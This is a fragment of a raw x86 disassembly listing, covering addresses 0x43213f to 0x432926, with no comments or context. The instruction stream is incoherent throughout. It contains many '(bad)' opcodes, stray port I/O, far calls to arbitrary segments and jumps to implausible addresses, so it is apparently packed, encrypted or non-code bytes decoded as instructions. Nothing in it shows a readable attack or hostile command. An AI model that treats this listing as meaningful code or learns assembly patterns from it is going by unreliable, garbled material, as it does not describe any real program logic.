  43213f:	jp     0x432190
  432141:	mov    ds:0x186803f5,eax
  432146:	les    eax,FWORD PTR [edx]
  432148:	nop
  432149:	sub    bh,BYTE PTR [ecx+0xee592e7]
  43214f:	pushf  
  432150:	imul   esp,ebp,0x3962291f
  432156:	sbb    DWORD PTR [ecx+0x6c0ef600],edx
  43215c:	dec    eax
  43215d:	(bad)  
  43215e:	ss popa 
  432160:	pop    eax
  432161:	(bad)  
  432162:	or     cl,al
  432164:	aas    
  432165:	cmp    al,0xe9
  432167:	(bad)  
  432168:	or     BYTE PTR [edx+0x62],al
  43216b:	or     al,0x1b
  43216d:	div    BYTE PTR [edx]
  43216f:	add    DWORD PTR [ebx],ebx
  432171:	out    dx,al
  432172:	xor    al,BYTE PTR ds:0x132e621
  432178:	add    eax,0xbc0132f6
  43217d:	adc    ebp,eax
  43217f:	xchg   esi,eax
  432180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432181:	cmp    BYTE PTR [edx-0x3b],ah
  432184:	jnp    0x4321bf
  432186:	out    0xba,al
  432188:	add    BYTE PTR [eax],al
  43218a:	add    BYTE PTR [eax],al
  43218c:	add    BYTE PTR [ebx+0x36],dl
  43218f:	jmp    0x4321fd
  432191:	loopne 0x432168
  432193:	xor    ah,dh
  432195:	iret   
  432196:	xchg   ecx,eax
  432197:	neg    BYTE PTR [esi+0x52eb7e3e]
  43219d:	test   BYTE PTR [ecx],bh
  43219f:	bound  eax,QWORD PTR ds:0xd6a398c
  4321a5:	lods   al,BYTE PTR ds:[esi]
  4321a6:	xor    ch,ah
  4321a8:	aas    
  4321a9:	xchg   ebp,eax
  4321aa:	mov    dl,0xe
  4321ac:	test   BYTE PTR [eax],0xce
  4321af:	or     eax,0xdb3993e9
  4321b4:	inc    ecx
  4321b5:	push   ss
  4321b6:	push   es
  4321b7:	in     al,dx
  4321b8:	or     BYTE PTR cs:[ecx+0x1b],al
  4321bc:	ins    DWORD PTR es:[edi],dx
  4321bd:	and    bh,BYTE PTR [edi-0x15]
  4321c0:	jmp    0xba928a27
  4321c5:	add    ch,ah
  4321c7:	xor    al,BYTE PTR [ebp-0x22e24]
  4321cd:	mov    ecx,0x46bcf37e
  4321d2:	shr    al,0x8d
  4321d5:	cmc    
  4321d6:	cwde   
  4321d7:	dec    ebx
  4321d8:	push   eax
  4321d9:	sbb    cl,BYTE PTR [ebp-0x71]
  4321dc:	ins    BYTE PTR es:[edi],dx
  4321dd:	gs mov dh,0xe7
  4321e0:	adc    eax,0x4ea595
  4321e5:	mov    dl,0xc5
  4321e7:	xchg   edx,eax
  4321e8:	idiv   BYTE PTR [esi]
  4321ea:	cmp    DWORD PTR [edx+0x2],esi
  4321ed:	sub    DWORD PTR [ebp+0x15e7],esi
  4321f3:	add    BYTE PTR [eax],al
  4321f5:	add    BYTE PTR [ecx-0x5d],ch
  4321f8:	dec    esi
  4321f9:	add    ah,bh
  4321fb:	pop    es
  4321fc:	in     al,dx
  4321fd:	(bad)  
  4321fe:	jmp    0x2e99363c
  432203:	call   0xd23b:0xb6b9126e
  43220a:	jb     0x4321cf
  43220c:	xchg   edx,eax
  43220d:	idiv   BYTE PTR [esi-0x16fdadc8]
  432213:	mov    ah,0xf6
  432215:	ret    0xc063
  432218:	call   0x108bfbc5
  43221d:	sbb    esp,0x4c
  432220:	ja     0x432266
  432222:	test   eax,0x958c99a4
  432227:	loop   0x432214
  432229:	(bad)  
  43222a:	mov    ecx,0x4eaac5cc
  43222f:	ror    BYTE PTR [edi-0x65942b40],0x8c
  432236:	xchg   ebp,eax
  432237:	mov    dh,0xeb
  432239:	(bad)  
  43223a:	jns    0x432208
  43223c:	push   0x6dc0aefa
  432241:	sub    ebp,0xffffff97
  432244:	and    eax,DWORD PTR [ebx]
  432246:	jns    0x4321fc
  432248:	push   cs
  432249:	je     0x4321db
  43224b:	jo     0x4322cb
  43224d:	xor    DWORD PTR [ecx+eiz*2+0x19900010],0xffffffb5
  432255:	adc    al,0xea
  432257:	push   cs
  432258:	fsub   QWORD PTR [ebx]
  43225a:	add    BYTE PTR [eax],al
  43225c:	add    BYTE PTR [eax],al
  43225e:	add    BYTE PTR [eax-0x6fba9e4f],cl
  432264:	mov    DWORD PTR [esi+0x43],edi
  432267:	ins    BYTE PTR es:[edi],dx
  432268:	popf   
  432269:	ret    0x85fa
  43226c:	fld    DWORD PTR [eax]
  43226e:	inc    eax
  43226f:	nop
  432270:	mov    WORD PTR [edi-0x74],cs
  432273:	les    esi,FWORD PTR [ebp+0x7c8ce6e6]
  432279:	dec    edi
  43227a:	cs loop 0x432216
  43227d:	mov    eax,0xef7168fd
  432282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432283:	call   DWORD PTR [eax+0x3a]
  432286:	jnp    0x432297
  432288:	mov    cl,BYTE PTR [edi]
  43228a:	repnz xchg ebp,eax
  43228c:	mov    eax,ds:0x7990439e
  432291:	mov    ds:0xf89680c,eax
  432296:	add    BYTE PTR [eax],dl
  432298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432299:	push   es
  43229a:	sti    
  43229b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43229c:	adc    DWORD PTR [edi],eax
  43229e:	inc    eax
  43229f:	nop
  4322a0:	pushf  
  4322a1:	fwait
  4322a2:	push   ebx
  4322a3:	je     0x43225a
  4322a5:	cmp    ah,BYTE PTR [bp+di+0x4c]
  4322a9:	cmc    
  4322aa:	out    0xbc,eax
  4322ac:	out    0x29,eax
  4322ae:	cli    
  4322af:	adc    eax,0x405ff34e
  4322b4:	pushf  
  4322b5:	push   edx
  4322b6:	dec    edi
  4322b7:	sub    cl,BYTE PTR [ebx+0x5a40142a]
  4322bd:	iret   
  4322be:	call   FWORD PTR [edx]
  4322c0:	icebp  
  4322c1:	xchg   ebx,eax
  4322c2:	in     al,dx
  4322c3:	add    BYTE PTR [eax],al
  4322c5:	add    BYTE PTR [eax],al
  4322c7:	add    BYTE PTR [eax+eiz*2],al
  4322ca:	(bad)  
  4322cb:	cli    
  4322cc:	popf   
  4322cd:	mov    dl,0xc5
  4322cf:	adc    al,dl
  4322d1:	mov    dl,0xa2
  4322d3:	cmp    al,0x7c
  4322d5:	adc    ch,al
  4322d7:	ret    
  4322d8:	pop    edi
  4322d9:	sub    DWORD PTR [eax],esi
  4322db:	sub    al,0x1b
  4322dd:	jnp    0x4322f3
  4322df:	cmp    eax,0x15d1de17
  4322e4:	loop   0x432365
  4322e6:	retf   0x8da3
  4322e9:	repnz cmc 
  4322eb:	sub    bh,BYTE PTR [ecx+esi*4-0x7f50fc0b]
  4322f2:	in     eax,0xc
  4322f4:	or     eax,0x9003f70e
  4322f9:	inc    esp
  4322fa:	idiv   DWORD PTR [edx-0x62]
  4322fd:	(bad)  
  4322fe:	pop    esi
  4322ff:	test   bh,dh
  432301:	pop    eax
  432302:	mov    ds:0x80c30a3c,eax
  432307:	ror    BYTE PTR [eax],0xf6
  43230a:	adc    esp,esp
  43230c:	or     al,0x72
  43230e:	in     al,0x87
  432310:	scas   eax,DWORD PTR es:[edi]
  432311:	mov    cl,0xf5
  432313:	add    edx,DWORD PTR ds:0x976bd92e
  432319:	mov    dl,0xf5
  43231b:	sub    edi,ebp
  43231d:	mov    ah,0xf5
  43231f:	add    edi,DWORD PTR [edi+0x64]
  432322:	jno    0x432367
  432324:	lock or eax,0xafbfc812
  43232a:	and    ecx,DWORD PTR [ecx+0x0]
  43232d:	add    BYTE PTR [eax],al
  43232f:	add    BYTE PTR [eax],al
  432331:	sub    eax,0x9af374a8
  432336:	cmc    
  432337:	and    BYTE PTR [edx+0x3d15d65b],cl
  43233d:	test   dh,dh
  43233f:	in     eax,0xc3
  432341:	xchg   edi,eax
  432342:	mov    ebx,0x8a99b638
  432347:	pop    eax
  432348:	mov    bh,0x8a
  43234a:	jle    0x43235a
  43234c:	popa   
  43234d:	push   edi
  43234e:	rol    BYTE PTR [eax+eax*2],cl
  432351:	mov    bh,0x7d
  432353:	jmp    0x43233e
  432355:	imul   ebx,edx,0x32
  432358:	add    DWORD PTR [edi],ebx
  43235a:	fsubr  st,st(3)
  43235c:	fimul  WORD PTR [eax]
  43235e:	scas   eax,DWORD PTR es:[edi]
  43235f:	push   0x7d
  432361:	dec    edi
  432362:	jle    0x432350
  432364:	jle    0x432301
  432366:	inc    esp
  432367:	lahf   
  432368:	sti    
  432369:	push   eax
  43236a:	jle    0x43235f
  43236c:	in     al,0xf9
  43236e:	jnp    0x43235b
  432370:	pop    esp
  432371:	pop    ds
  432372:	shl    dh,cl
  432374:	jmp    0x6ddcd60c
  432379:	xor    BYTE PTR [esi+0x16],dl
  43237c:	jmp    0xe7ddae14
  432381:	xchg   ebx,eax
  432382:	mov    dl,0xf7
  432384:	pop    ss
  432385:	mov    esp,0xcbbeea00
  43238a:	xor    esi,ecx
  43238c:	out    0x10,al
  43238e:	cmp    DWORD PTR [esi],ecx
  432390:	jmp    0x72669d28
  432395:	add    BYTE PTR [eax],al
  432397:	add    BYTE PTR [eax],al
  432399:	add    BYTE PTR [ecx-0x73da8502],bl
  43239f:	jns    0x432404
  4323a1:	in     eax,0x5d
  4323a3:	cmp    ecx,DWORD PTR [ebx+ebp*1-0x74]
  4323a7:	mov    al,ah
  4323a9:	add    BYTE PTR [edx-0x4f926688],cl
  4323af:	test   DWORD PTR [esi],ecx
  4323b1:	jmp    0xfbb6ae49
  4323b6:	jp     0x432430
  4323b8:	xchg   esi,eax
  4323b9:	lods   eax,DWORD PTR ds:[esi]
  4323ba:	iret   
  4323bb:	mov    ds:0x379b2a28,eax
  4323c0:	sub    cl,0x93
  4323c3:	mov    dl,0x99
  4323c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4323c6:	mov    bh,0xd1
  4323c8:	add    BYTE PTR ds:[edx+0x15685bf1],cl
  4323cf:	dec    edx
  4323d0:	dec    edi
  4323d1:	add    BYTE PTR [edx-0x19],bh
  4323d4:	call   0x7900:0xdb28d8c
  4323db:	leave  
  4323dc:	push   ss
  4323dd:	xor    BYTE PTR [ecx-0x4f],bh
  4323e0:	xchg   ecx,eax
  4323e1:	shl    BYTE PTR [esi+0x22],0xab
  4323e5:	mov    BYTE PTR ds:0x7983fd5d,ch
  4323eb:	inc    edx
  4323ec:	jno    0x432441
  4323ee:	mov    ah,0x62
  4323f0:	das    
  4323f1:	cmp    BYTE PTR fs:[ecx+0x5c],0x43
  4323f6:	push   ebx
  4323f7:	leave  
  4323f8:	sahf   
  4323f9:	cmc    
  4323fa:	ss mov eax,0x449a
  432400:	add    BYTE PTR [eax],al
  432402:	add    BYTE PTR [ebp-0x16cca4aa],cl
  432408:	pusha  
  432409:	pop    esp
  43240a:	push   0x4f55ad
  43240f:	(bad)  
  432410:	mov    eax,ds:0xb6b910e2
  432415:	xchg   ebx,eax
  432416:	ins    BYTE PTR es:[edi],dx
  432417:	lea    edx,[edx-0x6172bb6a]
  43241d:	xchg   ebp,eax
  43241e:	ins    BYTE PTR es:[edi],dx
  43241f:	frstor [esp+esi*2+0x62f16cff]
  432426:	or     DWORD PTR [ecx+edi*4+0x70da1402],ebx
  43242d:	jmp    0x432419
  43242f:	jmp    0x3493cfb7
  432434:	cmp    eax,0x4c99202f
  432439:	jmp    0xfe6c013c
  43243e:	aas    
  43243f:	mov    ecx,0x91246733
  432444:	mov    dh,0x93
  432446:	xor    eax,0x40016b90
  43244b:	nop
  43244c:	addr16 or eax,0xaae04fb
  432452:	sti    
  432453:	pop    esi
  432454:	mov    ebp,0xc4a823bb
  432459:	cmp    eax,0x9ca47754
  43245e:	dec    ebx
  43245f:	mov    ah,0x69
  432461:	aaa    
  432462:	inc    esi
  432463:	ja     0x432402
  432465:	sub    BYTE PTR [edi],dh
  432467:	add    BYTE PTR [eax],al
  432469:	add    BYTE PTR [eax],al
  43246b:	add    BYTE PTR [ebp+ebp*2+0x108b7500],bh
  432472:	pop    ss
  432473:	test   al,0xbc
  432475:	dec    ebp
  432476:	psubsb mm0,QWORD PTR [eax+0xb000f3a]
  43247d:	aad    0x37
  43247f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432480:	sbb    cl,BYTE PTR [ebp-0x522b7adb]
  432486:	add    BYTE PTR [ebx-0x3a],bl
  432489:	mov    esi,0xc73586c9
  43248e:	push   ecx
  43248f:	push   esp
  432490:	or     edi,DWORD PTR [esi]
  432492:	mov    edi,0x1d78664e
  432497:	cs (bad) 
  43249a:	cmp    ch,ch
  43249c:	add    al,BYTE PTR [ebp+0x25]
  43249f:	adc    eax,0xffffffc5
  4324a2:	mov    bl,0x67
  4324a4:	xchg   edi,eax
  4324a5:	or     DWORD PTR [ebx],edx
  4324a7:	add    bh,ah
  4324a9:	xchg   BYTE PTR [ebx+0x10],cl
  4324ac:	push   eax
  4324ad:	mov    DWORD PTR [esp+eax*2-0x291e462c],edx
  4324b4:	iret   
  4324b5:	pop    esi
  4324b6:	not    DWORD PTR [eax]
  4324b8:	push   eax
  4324b9:	mov    DWORD PTR [edi+0x1a9a5fa],edi
  4324bf:	inc    eax
  4324c0:	nop
  4324c1:	adc    BYTE PTR [ebx-0x7c],al
  4324c4:	ret    0xc9b2
  4324c7:	clc    
  4324c8:	jbe    0x432533
  4324ca:	cs (bad) 
  4324cc:	fwait
  4324cd:	cld    
  4324ce:	push   es
  4324cf:	lea    eax,[eax]
  4324d1:	add    BYTE PTR [eax],al
  4324d3:	add    BYTE PTR [eax],al
  4324d5:	xchg   ebx,eax
  4324d6:	sub    BYTE PTR [edx+0x44],dh
  4324d9:	add    edx,edi
  4324db:	fild   DWORD PTR [edi+edi*4-0x74e65d33]
  4324e2:	inc    ebx
  4324e3:	mov    ch,0x5
  4324e5:	test   DWORD PTR [edx+0x2f9dafab],0xaadc01fd
  4324ef:	popf   
  4324f0:	retf   
  4324f1:	in     al,0xae
  4324f3:	lock pop ecx
  4324f5:	outs   dx,BYTE PTR ds:[esi]
  4324f6:	stos   BYTE PTR es:[edi],al
  4324f7:	js     0x432546
  4324f9:	xchg   edi,eax
  4324fa:	xchg   eax,edi
  4324fc:	test   BYTE PTR [esi-0x4a],cl
  4324ff:	mov    dh,0xfc
  432501:	int3   
  432502:	jle    0x432565
  432504:	dec    eax
  432505:	lds    edi,FWORD PTR [ebx-0x3e]
  432508:	scas   eax,DWORD PTR es:[edi]
  432509:	popf   
  43250a:	repnz cmc 
  43250c:	xor    esi,esp
  43250e:	test   eax,0xe2da0841
  432513:	stc    
  432514:	add    edx,DWORD PTR [eax-0x77f1231c]
  43251a:	mov    eax,ds:0x6f020435
  43251f:	imul   BYTE PTR [edi-0x60367549]
  432525:	stc    
  432526:	jp     0x4324f5
  432528:	add    eax,0xf4b47be0
  43252d:	fdiv   DWORD PTR ds:0x815508b5
  432533:	mov    edi,esi
  432535:	outs   dx,DWORD PTR ds:[esi]
  432536:	push   cs
  432537:	xor    al,BYTE PTR [eax+eax*1]
  43253a:	add    BYTE PTR [eax],al
  43253c:	add    BYTE PTR [eax],al
  43253e:	xchg   esp,eax
  43253f:	push   es
  432540:	fprem1 
  432542:	aad    0x38
  432544:	or     eax,0xeb253ab
  432549:	sbb    ecx,0x7c6eecdc
  43254f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432550:	int    0x52
  432552:	lea    eax,[eax-0x4d8b9641]
  432558:	cwde   
  432559:	and    ch,BYTE PTR [ebx-0x5a]
  43255c:	jmp    0xabd:0xce35c84e
  432563:	leave  
  432564:	in     al,0x64
  432566:	sar    esi,0x9f
  432569:	aas    
  43256a:	jbe    0x43257e
  43256c:	jnp    0x432513
  43256e:	xchg   ebx,eax
  43256f:	js     0x4325d0
  432571:	push   ebx
  432572:	xor    eax,0x4ff4eb7d
  432577:	mov    ds:0x83a4e94e,eax
  43257c:	cmp    eax,0xfe99a62
  432581:	mov    al,0x3f
  432583:	fisttp WORD PTR [edi-0x5c5264d8]
  432589:	test   al,0x7f
  43258b:	lods   al,BYTE PTR ds:[esi]
  43258c:	mov    ds:0xfe37980,eax
  432591:	test   al,0x1b
  432593:	out    dx,al
  432594:	xor    dh,ch
  432596:	dec    esi
  432597:	sub    edx,DWORD PTR [edx+0xd]
  43259a:	jl     0x432526
  43259c:	mov    fs,WORD PTR [esi]
  43259e:	xchg   esp,eax
  43259f:	mov    dl,0x1f
  4325a1:	mov    BYTE PTR [eax],0x0
  4325a4:	add    BYTE PTR [eax],al
  4325a6:	add    BYTE PTR [ebx],bl
  4325a8:	bound  edx,QWORD PTR [ecx+0x78f546cc]
  4325ae:	loope  0x4325b2
  4325b0:	test   BYTE PTR [esi+0x42],al
  4325b3:	mov    esi,0xf01d0fd1
  4325b8:	test   eax,0xe494133e
  4325bd:	jmp    0x4325bb
  4325bf:	pop    ds
  4325c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4325c1:	dec    esi
  4325c2:	jmp    0x5d9bd9
  4325c7:	inc    edx
  4325c8:	out    0x34,al
  4325ca:	into   
  4325cb:	xor    al,0xee
  4325cd:	jno    0x4325d7
  4325cf:	mov    eax,ds:0xe2c852b1
  4325d4:	in     al,dx
  4325d5:	bound  edx,QWORD PTR [esi]
  4325d7:	jmp    0xe88e:0x9574e867
  4325de:	adc    eax,0x4ea7c5
  4325e3:	cli    
  4325e4:	repnz pop ss
  4325e6:	test   DWORD PTR [ecx-0x7e95fcbe],edi
  4325ec:	pop    ebp
  4325ed:	push   eax
  4325ee:	psadbw mm1,mm1
  4325f1:	and    al,0xf5
  4325f3:	cmp    eax,0xaeffa3ff
  4325f8:	scas   al,BYTE PTR es:[edi]
  4325f9:	push   cs
  4325fa:	pop    edi
  4325fb:	pop    ds
  4325fc:	pop    edx
  4325fd:	inc    esp
  4325fe:	pop    ecx
  4325ff:	stos   DWORD PTR es:[edi],eax
  432600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432601:	push   cs
  432602:	data16 mov dl,0xb9
  432605:	hlt    
  432606:	repz sub ah,BYTE PTR [edi+0x18]
  43260a:	mov    bh,0x0
  43260c:	add    BYTE PTR [eax],al
  43260e:	add    BYTE PTR [eax],al
  432610:	lds    ebx,FWORD PTR [ecx+0x17]
  432613:	push   edi
  432614:	adc    al,bh
  432616:	xor    ecx,DWORD PTR [ebx+0x3c502be0]
  43261c:	cmp    bh,BYTE PTR [eax-0x5da648e8]
  432622:	jmp    0x4325f3
  432624:	test   eax,0x65000f36
  432629:	lods   al,BYTE PTR ds:[esi]
  43262a:	xchg   ebx,eax
  43262b:	pop    esp
  43262c:	out    0x94,eax
  43262e:	xchg   esp,eax
  43262f:	inc    esp
  432630:	out    0x58,eax
  432632:	hlt    
  432633:	or     BYTE PTR [edx+0x61],dh
  432636:	std    
  432637:	daa    
  432638:	jb     0x432673
  43263a:	std    
  43263b:	sub    esi,DWORD PTR [ebp+esi*8+0x5f]
  43263f:	add    ch,dl
  432641:	mov    bh,0x94
  432643:	dec    esp
  432644:	nop
  432645:	sbb    eax,DWORD PTR [di-0x6127]
  43264a:	adc    BYTE PTR [ecx+0x56c4d0a9],cl
  432650:	rol    BYTE PTR [edx-0x60f4b0f1],cl
  432656:	out    dx,al
  432657:	pop    es
  432658:	inc    ebp
  432659:	mov    eax,ds:0x3a286db
  43265e:	cmp    eax,DWORD PTR [ebx+edi*4-0x617ae8a3]
  432665:	push   esi
  432666:	in     eax,0x20
  432668:	scas   al,BYTE PTR es:[edi]
  432669:	hlt    
  43266a:	stc    
  43266b:	test   BYTE PTR [esi+0x36],bh
  43266e:	stc    
  43266f:	mov    ebx,cs
  432671:	mov    ecx,DWORD PTR [esi+0xc8]
  432677:	add    BYTE PTR [eax],al
  432679:	cld    
  43267a:	mov    al,0x3a
  43267c:	xchg   esi,eax
  43267d:	or     cl,cl
  43267f:	and    al,0x86
  432681:	push   0xb4732507
  432686:	and    edi,ebx
  432688:	je     0x43261a
  43268a:	mov    eax,eax
  43268c:	xchg   BYTE PTR [edi+0x15],ah
  43268f:	push   edi
  432690:	out    0x3f,eax
  432692:	retf   
  432693:	and    edx,edi
  432695:	adc    al,0xca
  432697:	sahf   
  432698:	push   es
  432699:	or     edx,ecx
  43269b:	aaa    
  43269c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43269d:	or     BYTE PTR [ecx+0x65502d21],cl
  4326a3:	repnz mov BYTE PTR [esi+0x19],bl
  4326a7:	movntq QWORD PTR [edx-0xf],mm7
  4326ab:	loop   0x432721
  4326ad:	nop
  4326ae:	mov    DWORD PTR [esi+0x3a3f1bce],edx
  4326b4:	ins    BYTE PTR es:[edi],dx
  4326b5:	shl    BYTE PTR [edi],cl
  4326b7:	and    DWORD PTR [edx],ecx
  4326b9:	ds push edx
  4326bb:	(bad)  
  4326bd:	adc    eax,0xc1441140
  4326c2:	mov    dl,0x5f
  4326c4:	inc    edx
  4326c5:	cmp    bl,al
  4326c7:	sub    bl,cl
  4326c9:	adc    eax,0xbb80f5af
  4326ce:	call   0xcf08:0x9673c06f
  4326d5:	popa   
  4326d6:	adc    BYTE PTR [ecx-0x50],ah
  4326d9:	jae    0x43269d
  4326db:	or     al,0x89
  4326dd:	add    BYTE PTR [eax],al
  4326df:	add    BYTE PTR [eax],al
  4326e1:	add    BYTE PTR [eax+0x73b06f10],ch
  4326e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4326e8:	pop    ebp
  4326e9:	shl    BYTE PTR [ebx-0x62],0x72
  4326ed:	push   edx
  4326ee:	sbb    al,0xac
  4326f0:	iret   
  4326f1:	(bad)  
  4326f2:	in     al,dx
  4326f3:	adc    BYTE PTR [edi-0x58],ch
  4326f6:	mov    bl,0xa2
  4326f8:	inc    eax
  4326f9:	psadbw mm3,QWORD PTR [ebp-0x1b785676]
  432700:	jb     0x4326c2
  432702:	mov    bl,0x95
  432704:	test   DWORD PTR [ebp+0x17da0618],ebx
  43270a:	push   0x5a358dff
  43270f:	ret    
  432710:	and    cl,dl
  432712:	in     al,0x25
  432714:	mov    cl,0xdf
  432716:	lahf   
  432717:	loop   0x4326a5
  432719:	xor    al,0xa4
  43271b:	into   
  43271c:	ret    
  43271d:	ret    
  43271e:	aaa    
  43271f:	mov    esp,0x7204053a
  432724:	jno    0x43276a
  432726:	mov    ds:0x217f5b9b,eax
  43272b:	(bad)  
  43272c:	call   0x611eab9
  432731:	add    eax,0x89257043
  432736:	fimul  DWORD PTR [ecx+0x76f941f4]
  43273c:	jno    0x432781
  43273e:	xor    DWORD PTR [ebx-0x47b705f2],0x4b
  432745:	sldt   WORD PTR [eax]
  432748:	add    BYTE PTR [eax],al
  43274a:	add    BYTE PTR [edi+0x1142cf2c],bh
  432750:	jae    0x432758
  432752:	stos   DWORD PTR es:[edi],eax
  432753:	(bad)  
  432754:	mov    dl,0x44
  432756:	bound  eax,QWORD PTR [edx-0x6c1a9308]
  43275c:	(bad)  
  43275d:	sbb    DWORD PTR [esi-0x2b144d13],eax
  432763:	scas   eax,DWORD PTR es:[edi]
  432764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432765:	dec    esi
  432766:	jmp    0xe956387b
  43276b:	adc    BYTE PTR [ecx+0x7b88dd0e],bh
  432771:	and    al,0x5e
  432773:	xchg   BYTE PTR [edx],dl
  432775:	add    DWORD PTR [ecx-0x16cb0a6d],ebp
  43277b:	pop    ebp
  43277c:	xor    eax,0xb290f576
  432781:	push   cs
  432782:	ror    ebx,1
  432784:	call   0xe833:0x43bbe952
  43278b:	xchg   ebx,eax
  43278c:	sub    eax,0x2ab8dae5
  432791:	dec    ecx
  432792:	cmp    eax,0x83eed70a
  432797:	xchg   ecx,eax
  432798:	in     eax,0x3f
  43279a:	pop    esp
  43279b:	push   es
  43279c:	pop    edx
  43279d:	ds push es
  43279f:	out    dx,al
  4327a0:	lods   eax,DWORD PTR ds:[esi]
  4327a1:	jmp    0x432757
  4327a3:	sub    eax,DWORD PTR ds:0x78f9e953
  4327a9:	xchg   edi,eax
  4327aa:	mov    ah,0xb7
  4327ac:	mov    ds:0xe94e,al
  4327b1:	add    BYTE PTR [eax],al
  4327b3:	add    BYTE PTR [edx+0x63],ah
  4327b6:	xchg   ecx,eax
  4327b7:	test   eax,0xa920b0d9
  4327bc:	lods   eax,DWORD PTR ds:[esi]
  4327bd:	test   DWORD PTR [esi],ecx
  4327bf:	jmp    0x543457
  4327c4:	call   0xe85e:0xc9459a5d
  4327cb:	jne    0x4327be
  4327cd:	shl    BYTE PTR [edx],0x2c
  4327d0:	stos   BYTE PTR es:[edi],al
  4327d1:	push   0xffffffeb
  4327d3:	imul   esi,DWORD PTR [esi],0x2985bdc2
  4327d9:	cmp    ecx,ebx
  4327db:	push   0xffeb79ed
  4327e0:	xchg   ebx,eax
  4327e1:	jbe    0x4327cb
  4327e3:	xor    eax,0x4f2ce1
  4327e8:	ss fwait
  4327ea:	data16 adc bh,BYTE PTR [ecx-0x52]
  4327ee:	xchg   ebx,eax
  4327ef:	lock xor BYTE PTR [ebx],bh
  4327f2:	adc    eax,DWORD PTR [ebp-0x4530c5c1]
  4327f8:	ss scas al,BYTE PTR es:[edi]
  4327fa:	push   cs
  4327fb:	add    BYTE PTR [edx-0x4d74d31b],ch
  432801:	xchg   esi,eax
  432802:	rcr    DWORD PTR [esi+edx*8-0x3f],1
  432806:	xchg   ebx,eax
  432807:	push   es
  432808:	scas   al,BYTE PTR es:[edi]
  432809:	push   0xb171300f
  43280e:	push   cs
  43280f:	(bad)  
  432810:	das    
  432811:	jne    0x43284d
  432813:	add    BYTE PTR [ecx-0x4f],ch
  432816:	cdq    
  432817:	dec    esi
  432818:	add    BYTE PTR [eax],al
  43281a:	add    BYTE PTR [eax],al
  43281c:	add    BYTE PTR [ecx-0x67],bl
  43281f:	xchg   edi,eax
  432820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432822:	rcl    DWORD PTR [ebp+eax*2+0x3c4df775],0xc2
  43282a:	imul   ecx,ebx,0xffffff89
  43282d:	out    dx,eax
  43282e:	jo     0x43286d
  432830:	push   ecx
  432831:	mov    ah,0x33
  432833:	in     eax,dx
  432834:	cld    
  432835:	ss shl bl,0x13
  432839:	xchg   cl,al
  43283b:	call   0xf3fcca99
  432840:	lds    edx,FWORD PTR [eax+0x49fa1f9b]
  432846:	xor    eax,0xfe900012
  43284b:	xchg   esi,eax
  43284c:	loope  0x432842
  43284e:	xor    esp,DWORD PTR [eax]
  432850:	rcl    DWORD PTR [eax+0x5d48cf8b],0x42
  432857:	pop    eax
  432858:	test   ah,al
  43285a:	dec    esp
  43285b:	and    dl,bh
  43285d:	mov    WORD PTR [ebx+0x5b38000f],cs
  432863:	out    0xff,eax
  432865:	(bad)  
  432866:	mov    esp,0x2ce48c8d
  43286b:	and    dl,bh
  43286d:	test   al,0x6
  43286f:	mov    edi,edx
  432871:	scas   eax,DWORD PTR es:[edi]
  432872:	pop    es
  432873:	mov    bh,0xfb
  432875:	nop
  432876:	add    al,0xa9
  432878:	pop    es
  432879:	sub    cl,BYTE PTR [ebx-0x2b738de0]
  43287f:	push   es
  432880:	pusha  
  432881:	add    BYTE PTR [eax],al
  432883:	add    BYTE PTR [eax],al
  432885:	add    BYTE PTR [esi+0x4c7f0f49],ah
  43288b:	push   esi
  43288c:	xchg   DWORD PTR [edi],ebp
  43288e:	mov    BYTE PTR [ecx+0x3d77520f],cl
  432894:	adc    edi,ebx
  432896:	test   DWORD PTR ds:0x8904005,ebx
  43289c:	push   esp
  43289d:	or     edx,DWORD PTR [ebx]
  43289f:	aas    
  4328a0:	cmp    edi,edx
  4328a2:	imul   edi,DWORD PTR [edx-0x1c],0xffffffbf
  4328a6:	ror    al,1
  4328a8:	ins    BYTE PTR es:[edi],dx
  4328a9:	cmp    BYTE PTR fs:[eax+0x5c],bl
  4328ad:	jle    0x43287c
  4328af:	lods   eax,DWORD PTR ds:[esi]
  4328b0:	and    BYTE PTR [esi-0x36937e43],al
  4328b6:	cmp    ch,ah
  4328b8:	test   edx,edi
  4328ba:	daa    
  4328bb:	adc    BYTE PTR [ebp-0x19],dl
  4328be:	dec    esp
  4328bf:	mov    bl,0x1b
  4328c1:	add    edx,DWORD PTR [eax+0x6503f170]
  4328c7:	daa    
  4328c8:	rol    DWORD PTR [ebx+0x3f24efb],1
  4328ce:	nop
  4328cf:	fmul   QWORD PTR [edi*2-0x2f85da08]
  4328d6:	in     eax,0x73
  4328d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4328d9:	sbb    al,0xaa
  4328db:	jle    0x432899
  4328dd:	xor    DWORD PTR [esi],edx
  4328df:	ds mov ch,0x2e
  4328e2:	fidiv  DWORD PTR [ebx-0x3]
  4328e5:	addr16 xchg esp,eax
  4328e7:	mov    dl,0xf5
  4328e9:	jle    0x4328eb
  4328eb:	add    BYTE PTR [eax],al
  4328ed:	add    BYTE PTR [eax],al
  4328ef:	or     al,0xd7
  4328f1:	jg     0x432924
  4328f3:	mov    edx,0xbad3f608
  4328f8:	popf   
  4328f9:	adc    eax,0x78b2501a
  4328fe:	dec    eax
  4328ff:	fwait
  432900:	sub    eax,0x2a9db87c
  432905:	or     al,0xf5
  432907:	xlat   BYTE PTR ds:[ebx]
  432908:	sub    eax,0x1e9ad143
  43290d:	xor    eax,0xcd6f58d2
  432912:	fist   DWORD PTR [eax+0x5f9bf5b2]
  432918:	cdq    
  432919:	mov    cl,0x3
  43291b:	js     0x4328d6
  43291d:	sbb    eax,DWORD PTR [ebx]
  43291f:	nop
  432920:	sub    DWORD PTR [edx+0x160dde4b],ecx
  432926:	add    al,0x5
